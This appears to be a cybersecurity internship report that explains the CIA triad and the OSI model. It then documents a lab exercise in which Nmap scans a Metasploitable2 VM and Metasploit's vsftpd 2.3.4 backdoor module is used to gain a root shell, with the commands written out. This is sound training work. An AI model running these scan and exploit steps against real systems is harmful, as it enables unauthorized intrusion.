# ApexPlanet Cyber Security Internship - Task 1 Report

## Step 1: The CIA Triad Foundations
In cyber security, every defensive strategy and control is designed to protect three core principles:
* **Confidentiality:** Ensuring that sensitive data is kept secret and accessible only to authorized users (e.g., via strong encryption, access controls).
* **Integrity:** Guaranteeing that information is accurate, complete, and has not been maliciously altered or tampered with in transit or at rest (e.g., via hashing).
* **Availability:** Ensuring that systems, networks, and data are consistently accessible to authorized users when needed (e.g., mitigating DDoS attacks, maintaining backups).


## Step 4: The OSI Model Layer Analysis
The Open Systems Interconnection (OSI) model standardizes network communications into 7 distinct layers:

| Layer | Name | Core Functionality | Practical Example |
| :--- | :--- | :--- | :--- |
| **7** | **Application** | Human-computer interaction layer where applications access network services. | HTTP, HTTPS, FTP, SSH |
| **6** | **Presentation** | Translates, encrypts, and compresses data for the application layer. | SSL/TLS, JPEG, ASCII |
| **5** | **Session** | Establishes, manages, and terminates connections between local and remote applications. | NetBIOS, RPC |
| **4** | **Transport** | Handles end-to-end data transfer flow control, error checking, and protocols. | TCP (Reliable), UDP (Fast) |
| **3** | **Network** | Manages logical addressing and determines the physical path data takes across networks. | IP Addresses, Routers |
| **2** | **Data Link** | Packages data into frames for node-to-node transfer across a local physical link. | MAC Addresses, Switches |
| **1** | **Physical** | Transmits raw bitstreams over physical mediums (cables, radio waves). | Ethernet Cables, Wi-Fi |


## Step 5: Active Reconnaissance & Service Enumeration
An active network reconnaissance scan was executed using Nmap within an isolated host virtualization layer. To bypass VirtualBox network filtering anomalies dropping half-open stealth packets, a standard TCP Connect Scan (`-sT`) coupled with service version detection (`-sV`) was deployed.

### Target Specifications
* **Attacker Host:** Kali Linux VM (`10.0.2.15`)
* **Target Host:** Metasploitable2 VM (`10.0.2.3`)

### Discovered Exposed Services
| Port | Protocol | State | Service | Software Version |
| :--- | :--- | :--- | :--- | :--- |
| 21 | TCP | Open | FTP | vsftpd 2.3.4 |
| 22 | TCP | Open | SSH | OpenSSH 4.7p1 Debian 8ubuntu1 |
| 23 | TCP | Open | Telnet | Linux telnetd |
| 80 | TCP | Open | HTTP | Apache httpd 2.2.8 ((Ubuntu) DAV/2) |


## Step 6: Vulnerability Exploitation & Verification
The service version tracking identified `vsftpd 2.3.4` running on Port 21. This specific version contains a historic malicious application backdoor execution path. 

### Exploitation Lifecycle
1. **Framework Initialization:** Deployed the Metasploit Framework (`msfconsole`).
2. **Module Selection:** Selected the matching payload handler via `use exploit/unix/ftp/vsftpd_234_backdoor`.
3. **Parameter Configuration:** * Configured targeted remote host: `set RHOSTS 10.0.2.3`
   * Configured localized callback interface: `set LHOST 10.0.2.15`
4. **Execution:** Triggered the exploit module sequence.

### Post-Exploitation Proof of Access
The backdoor execution string successfully forced an unauthenticated command shell to spawn. Administrative session validation was confirmed interactively:
* **Command Executed:** `getuid` / `whoami`
* **Privilege Level Returned:** `root` (UID 0 - Maximum system administrative access verified).
